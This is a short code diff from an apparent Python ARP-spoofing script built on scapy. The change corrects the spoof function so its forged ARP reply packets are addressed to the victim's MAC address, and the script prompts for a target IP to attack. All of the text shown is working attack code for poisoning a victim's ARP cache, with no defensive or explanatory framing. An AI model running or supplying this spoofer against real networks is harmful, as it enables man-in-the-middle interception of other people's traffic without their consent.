@@ -17,7 +17,7 @@ def get_mac(ip):
     return clients_list
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_ip, psrc=spoof_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 target_ip = input("enter target ip : ")
